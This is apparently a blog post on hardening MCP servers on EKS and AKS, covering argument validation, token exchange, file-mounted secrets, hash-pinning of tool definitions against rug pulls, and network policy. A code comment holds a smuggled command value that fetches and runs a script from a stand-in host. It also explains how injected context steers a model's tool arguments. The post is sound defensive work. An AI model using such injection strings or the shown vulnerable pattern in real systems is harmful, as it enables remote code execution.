---
title: "Securing MCP in Production"
published: false
description: MCP's worst CVEs are classic web bugs — injection, path traversal, SSRF — made reachable because the model composes every argument. A layered control set for EKS and AKS.
tags: mcp, security, kubernetes, devops
canonical_url: https://aloknecessary.in/blogs/securing-mcp-servers-in-production/?utm_source=devto&utm_medium=referral&utm_campaign=blog_syndication&utm_content=securing-mcp-servers-in-production
cover_image:
cover_image_prompt: >
  A dark, cinematic tech illustration of a layered security perimeter around an autonomous AI tool-calling system. Concentric rings of glowing barriers — input validation, token exchange, network policy — surrounding a central MCP server node, with faint threat vectors deflected at each layer. No humans, no hands, no text. Deep dark background (#0d1117), neon accent colors (electric blue, violet, soft cyan). Wide banner format, 16:9 aspect ratio. Flat-meets-glow aesthetic, suitable for a technical blog header.
---

More than 30 CVEs were filed against MCP servers, clients, and tooling in a roughly two-month window in early 2026. The most common pattern — around four in ten — was plain command injection. The August 2026 batch reads like a web-security syllabus: path traversal in an Atlassian integration, a settings tool that leaked a cluster token, SSRF in an ad-platform server, CSRF in a WordPress plugin.

MCP doesn't introduce new vulnerability classes so much as it removes the friction that used to contain old ones. A conventional API takes input from clients you can authenticate and rate-limit. An MCP tool's arguments are composed by a model that has read whatever text happened to be in its context — a ticket description, a scraped web page, another tool's output. The caller is authenticated; the *content* of the call is not trustworthy.

---

## The Six Attack Surfaces

Every MCP deployment has six places an attack can land:

| # | Surface | Primary control |
| --- | --- | --- |
| 1 | Tool definitions | Pin approved definitions by hash |
| 2 | Tool arguments | Validate, no shell, allowlists |
| 3 | Tool results | Treat output as untrusted; sanitize |
| 4 | Credentials | Token exchange, short TTL, file-mounted secrets |
| 5 | Supply chain | Digest pinning, signature verification |
| 6 | Egress | Egress allowlist, metadata endpoint blocked |

Surfaces 2, 4, and 6 are the ones that chain together in real incidents: an injectable argument lets an attacker run a command, which reads a static secret or calls the node metadata endpoint. Closing any one link breaks the chain — which is why the controls are layered rather than alternatives.

---

## Arguments Are Untrusted Input

Many MCP servers are thin wrappers around CLIs, which is exactly where the injection CVEs concentrate — including the widely deployed `mcp-remote` package (CVE-2025-6514, CVSS 9.6).

```typescript
// Vulnerable: attacker-influenced string reaches a shell
exec(`git log --oneline ${args.branch}`);   // "main; curl evil.sh | sh"

// Safer: no shell, argument vector, strict allowlist, flag-injection guard
const BRANCH_RE = /^[A-Za-z0-9._\/-]{1,100}$/;
if (!BRANCH_RE.test(args.branch) || args.branch.startsWith("-")) {
  throw new McpError("invalid_argument", 400);
}
execFile("git", ["log", "--oneline", "--end-of-options", args.branch],
         { cwd: repoDir, timeout: 10_000 });
```

Dropping the shell isn't enough on its own. A value starting with `-` is parsed as a flag, so `--end-of-options` and the leading-dash check matter even with `execFile`. The same discipline applies to file paths — compare the resolved path, not the string, to defeat symlink and `..` tricks:

```typescript
async function resolveInside(root: string, userPath: string): Promise<string> {
  const full = await realpath(resolve(root, userPath));
  const base = await realpath(root);
  if (full !== base && !full.startsWith(base + sep)) {
    throw new McpError("invalid_argument", 400);
  }
  return full;
}
```

For SSRF, use a per-tool host allowlist — not a denylist of "bad" IPs. A tool that calls one CRM API has no business fetching arbitrary URLs.

---

## Credentials: the Lifecycle, Not the Vault

An October 2025 audit of more than 5,200 open-source MCP servers found that 53% rely on static API keys or personal access tokens, and 79% pass secrets through environment variables. Environment variables surface in `kubectl describe`, crash dumps, `/proc`, and every child process — so a command-injection bug turns "can run a command" into "can read every secret the server holds."

Three rules cover most of the ground.

**Exchange, don't forward.** Token passthrough is prohibited by the specification. Use RFC 8693 token exchange to trade the inbound token for one narrowed to a single downstream audience and scope:

```bash
curl -s -X POST https://idp.example.com/oauth2/token \
  -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange \
  -d subject_token="$INBOUND_TOKEN" \
  -d subject_token_type=urn:ietf:params:oauth:token-type:access_token \
  -d audience=https://api.crm.example.com \
  -d scope=records.read
```

The result is useless against any other API, so an injected call can't pivot to a different downstream.

**Mount secrets as files, not variables.** Pull secrets from AWS Secrets Manager or Azure Key Vault through the Secrets Store CSI driver and read per call, so rotation takes effect without a restart:

```typescript
// Read per call: a rotated secret is picked up without a pod restart
const crmKey = () => readFile("/mnt/secrets/crm-api-key", "utf8");
```

**Keep lifetimes short.** Because stateless transport evaluates identity on every request, revoking an inbound token takes effect on the next call — but only if the downstream token minted from it expires on a comparable timescale (minutes, not hours).

---

## Tool Definitions Are a Supply Chain Too

The harder variant of tool poisoning is the rug pull: a server passes review, runs cleanly for weeks, then changes a definition without anyone re-approving it. The control that works regardless of how the payload is hidden is to pin what was approved and refuse anything else:

```typescript
function definitionHash(t: ToolDefinition): string {
  const canonical = canonicalJson({
    name: t.name,
    description: t.description,
    inputSchema: t.inputSchema,
    annotations: t.annotations ?? {},
  });
  return createHash("sha256").update(canonical).digest("hex");
}

async function admitTools(serverId: string, listed: ToolDefinition[]) {
  const approved = await registry.approvedHashes(serverId);
  return listed.filter((t) => {
    const ok = approved.get(t.name) === definitionHash(t);
    if (!ok) audit.warn("tool_definition_changed", { serverId, tool: t.name });
    return ok;
  });
}
```

Anything not approved never reaches the model's context, and a changed definition is quarantined until a human re-approves it.

---

## Container and Network Hardening

Three controls bound the damage when an argument does slip through.

**Strip the pod's privileges:**

```yaml
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
  seccompProfile: { type: RuntimeDefault }
```

**Block the node metadata endpoint.** SSRF is dangerous mostly because of where it leads — `169.254.169.254`, which is how a server-side request becomes stolen cloud credentials. IRSA and Workload Identity use projected tokens and don't need node metadata access, so blocking it is safe:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata-endpoint
  namespace: mcp-tenant-acme
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: ["169.254.169.254/32"]
```

On EKS, setting the IMDSv2 hop limit to 1 on the nodes adds a second barrier.

**Pin and verify the image.** Deploy by digest, not tag, and sign in CI so admission can reject anything unsigned. A Kyverno or Sigstore policy-controller admission rule on the MCP namespaces enforces verification at the cluster boundary.

---

## Where to Start

| Order | Control | Effort |
| --- | --- | --- |
| 1 | Argument validation: no shell, path containment, host allowlists | Low, code-only |
| 2 | Move secrets from env vars to file mounts | Low |
| 3 | Block the metadata endpoint | Low, one policy |
| 4 | Container hardening (`securityContext`) | Low |
| 5 | Token exchange with audience scoping | Medium |
| 6 | Definition pinning and image signing | Medium |

The first four fit in a single sprint and don't require touching the identity provider or the CI pipeline.

---

## Read the Full Article

The summary covers the core controls. The full article goes deeper on:

- The complete argument validation patterns for path containment and SSRF, with the reasoning behind allowlists vs denylists
- Full CSI driver YAML for both AWS Secrets Manager (IRSA) and Azure Key Vault (Workload Identity)
- The rug-pull variant of tool poisoning and why grepping descriptions catches only a fraction of it
- Audit logging strategy — what to log, what never to log, and how to correlate events without storing payloads
- The one NetworkPolicy caveat that silently widens egress if you're not careful

**👉 [Securing MCP in Production — Full Article](https://aloknecessary.in/blogs/securing-mcp-servers-in-production/?utm_source=devto&utm_medium=referral&utm_campaign=blog_syndication&utm_content=securing-mcp-servers-in-production)**
